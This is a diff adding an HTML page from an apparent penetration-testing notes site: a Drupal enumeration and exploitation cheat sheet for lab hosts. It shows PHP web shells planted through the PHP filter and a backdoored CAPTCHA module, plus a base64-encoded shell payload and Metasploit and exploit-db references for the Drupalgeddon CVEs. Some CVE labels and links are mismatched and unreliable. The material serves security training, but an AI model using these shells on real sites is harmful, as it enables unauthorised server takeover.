@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Drupal (TCP/80, TCP/443)</h1>
+            <p>Drupal is a free, modular, multipurpose, and highly configurable content management system (CMS).</p>
+        </div>
+        <div class="notion-body">
+            <h2>Enumeration</h2>
+            <ul>
+                <h3>Automated enumeration</h3>
+                <ul>
+                    <p>Using nuclei we can automate the enumeration</p>
+                    <pre><code class="language-bash">nuclei -u http://drupal-qa.inlanefreight.local -tags drupal</code></pre>
+                </ul> 
+                
+                <h3>Manual enumeration</h3>
+                <ul>    
+                <p>In order to check if a website is a drupal we could perform the following request</p>
+                <pre><code class="language-bash">curl -s http://drupal.inlanefreight.local | grep Drupal</code></pre>
+                <p>Another easy way to identify it is by requesting the <b>robots.txt changelog.txt readme.txt</b></p>
+                <p>Since drupal indexes content using nodes we can perform several request to check for node information</p>
+                <p>Another way to check it is by using curl</p>
+                <pre><code class="language-bash">http://blog.inlanefreight.local/node/1
+http://blog.inlanefreight.local/node/2
+http://blog.inlanefreight.local/node/3
+...</code></pre>    
+                
+                <h4>Interesting endpoints</h4>
+                <pre><code class="language-bash">http://drupal-qa.inlanefreight.local/sites/
+http://drupal-qa.inlanefreight.local/CHANGELOG.txt</code></pre>
+            
+                <h4>Bruteforcing usernames</h4>
+                <ul>
+                    Once you have a user test the bruteforce
+                </ul>    
+            </ul>               
+        </ul>
+
+            <h2>Exploitation</h2>
+            <ul>
+                <h3>Command execution</h3>
+                <ul>
+                    <h4>Versions prior to 8</h4>
+                    <ul>
+                    <p>In older versions of Drupal, it was possible to log in as an admin and enable the <b>PHP filter</b> module. Follow the steps to do so</p>
+                    <ul>
+                        <li>In the main page of drupal click on <b>Modules</b> at the top part. Then select the module called PHP filter, scroll down and save the configuration. It is possible that the PHP format is not enabled by default so you need to get insto the module permissions (Click on the key icon at the right side). Select <b>Use the PHP code text format</b></li>
+                        <li>Go to <b>content</b> -> <b>Add content</b> -> <b>Basic page</b></li>
+                        <li>Now create a malicious page with the following php code</li>
+                        <pre><code class="language-php">&lt;?php system($_GET['cmd']); ?></code></pre>
+                        <li>Select text format <b>PHP code</b> and save changes.</li>
+                        <li>Finally just go to the web you just created and pass the command to the parameter</li>    
+                        <pre><code class="language-php">http://drupal-qa.inlanefreight.local/node/3?cmd=id</code></pre>    
+                    </ul>
+
+                    </ul>
+                    <h4>Versions onwards to 8</h4>
+                    <ul>
+                        <p>In that case the <b>PHP filter</b>module is no installed by default so to leverege this functionallity will have to install the module ourselves</p>
+                        <p>The following url contains the package <a class="notion-link" href="https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz">Here</a></p>
+                        <p>Once you have it just go to <b>Modules</b> and select the <b>Module manager</b> in order to upload modules then in the upper part of the module section will appear a <b>Install new module</b> button. Select the package (package.tar.gz) that you just downloaded and click the install button</p>
+                        <p>Now perform the same process as previously mentioned</p>
+                    </ul>    
+                </ul>
+                
+                <h3>Uploading a malicious module</h3>
+                <ul>
+                    <p>Drupal allows users with appropiate permissions to upload a new module. A backdoored can be created by adding a shell to an existing module. For example you can download <b>CAPTCHA</b> module from <a class="notion-link" href="https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz">Here</a></p>
+                    <p>Once you get it unarchive it with</p>
+                    <pre><code class="language-bash">tar xvf your_module.tar.gz</code></pre>    
+                    <p>Create the php code to execute commands</p>
+                    <pre><code class="language-php">&lt;?php system($_GET['cmd']); ?></code></pre>    
+                    <p>Create the <b>.htaccess file to give ourselves access to the folder</b></p>
+                    <pre><code class="language-xml">&lt;IfModule mod_rewrite.c&gt;
+  RewriteEngine On
+  RewriteBase /
+&lt;/IfModule&gt;</code></pre>
+                    <p>Now move those file to the module folder and archive all content</p>
+                    <pre><code class="language-bash">mv shell.php .htaccess captcha
+tar cvf captcha.tar.gz captcha/</code></pre>    
+                </ul>
+
+                <h3>Highlighted vulnerabilities</h3>
+                <ul>
+                    <p>There are three vulnerabilities which affected to the core of druapal and deserve to be registered in this website</p>
+                    <h4>Drupalgeddon (CVE-2014-3704)</h4>
+                    <ul>
+                        <p>Affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.</p>
+                        <p>Poc can be found <a class="notion-link" href="https://www.exploit-db.com/exploits/34992">here</a></p>
+                    </ul>
+
+                    <h4>Drupalgeddon2 (CVE-2018-7600)</h4>
+                    <ul>
+                        <p>Remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.</p>
+                        <p>Poc can be found <a class="notion-link" href="https://www.exploit-db.com/exploits/34992">here</a></p>
+                        <p>This poc will generate a hello.txt file, check if it was created in the drupal server and then modify the script in order to add any payload you would like</p>
+                        <p>A recently tested payload is the following</p>
+                        <pre><code class="language-xml">echo -n "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee shell.php</code></pre>
+                        <b>Remember to modify the output filename in all parts of the exploit</b>
+                    </ul>
+
+                    <h4>Drupalgeddon3 (CVE-2018-7600)</h4>
+                    <ul>
+                        <p>CVE-2018-7602, also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.</p>
+                        <p>Poc can be found in metasploit database. This is the module</p>
+                        <pre><code class="language-bash">exploit/multi/http/drupal_drupageddon3</code></pre> 
+                        <b>Imporatant: It is mandatory to have credentials since the module requires a valid session cookie to exploit it</b> 
+                    </ul>
+                
+                </ul>
+            </ul>
+        </div>
+    </div>
+
+
+</body>
+</html>
